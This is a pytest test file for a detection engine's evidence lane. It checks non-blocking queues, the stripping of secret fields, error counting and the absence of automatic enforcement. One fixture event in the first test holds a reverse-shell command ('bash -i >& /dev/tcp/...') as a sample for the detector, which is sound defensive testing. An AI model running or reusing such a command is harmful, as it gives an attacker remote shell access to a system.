"""Deep engine lane never blocks or authorizes the Smart Rules hot path."""
import time
from pathlib import Path

from satsuma_engine.live_lane import DeepEvidenceLane
from satsuma_engine.rule_model import load_rules


def _rules():
    path = Path(__file__).resolve().parents[1] / 'satsuma_engine' / 'rules'
    return load_rules([path]).rules


def _wait_until(fn, timeout=2.0):
    until = time.monotonic() + timeout
    while time.monotonic() < until:
        if fn():
            return True
        time.sleep(0.01)
    return False


def test_engine_emits_evidence_without_automatic_actions():
    lane = DeepEvidenceLane(_rules(), batch=1).start()
    try:
        assert lane.submit({'id': 'sample-1', 'source': 'sys_proc',
                            'timestamp': '2026-11-14T10:00:00Z',
                            'cmd': 'bash -i >& /dev/tcp/192.0.2.1/4 0>&1',
                            'pid': 123, 'starttime': 10, 'env': {'SECRET': 'never retain'}})
        assert _wait_until(lambda: lane.health()['emitted'] > 0)
        output = lane.drain()
        assert output
        assert all(x['authorization'] == 'none' for x in output)
        assert all('actions' not in x and 'cmd' not in x and 'env' not in x
                   and 'raw_event' not in x for x in output)
        assert lane.health()['scans'] >= 1
    finally:
        lane.close()


def test_queue_overflow_is_visible_not_blocking():
    lane = DeepEvidenceLane(_rules(), input_limit=1)
    assert lane.submit({'id':'one', 'cmd':'a'})
    start = time.monotonic()
    assert not lane.submit({'id':'two', 'cmd':'b'})
    assert time.monotonic() - start < 0.1
    assert lane.health()['input_dropped'] == 1


def test_missing_id_or_secret_fields_are_not_accepted():
    lane = DeepEvidenceLane(_rules(), input_limit=2)
    assert not lane.submit({'cmd':'bash'})
    assert lane.submit({'id':'x', 'env': 'password=123', 'metadata': {'token': 'secret'}})
    _, e = lane._input.get_nowait()
    assert 'env' not in e['event'] and 'metadata' not in e['event']


def test_scan_failure_is_counted_without_blocking():
    class Broken:
        def __init__(self, rules): pass
        def scan(self, events): raise RuntimeError('error')
    lane = DeepEvidenceLane(_rules(), batch=1, engine_factory=Broken).start()
    try:
        assert lane.submit({'id':'x'})
        assert _wait_until(lambda: lane.health()['errors'] > 0)
        assert lane.health()['last_error_type'] == 'RuntimeError'
        assert lane.drain() == []
    finally:
        lane.close()


def test_start_and_stop_health():
    lane = DeepEvidenceLane(_rules()).start()
    assert lane.health()['running']
    lane.close()
    assert not lane.health()['running']


def test_live_path_has_no_findings_or_enforcement_dependencies():
    import inspect
    import run_satsuma_teams as brain
    source = inspect.getsource(brain._flow_tick)
    assert 'deep_lane.submit({' in source and 'interactive_process_test_mode' in source
    assert 'deep_lane.drain' not in source
    assert 'finding_worker' not in source
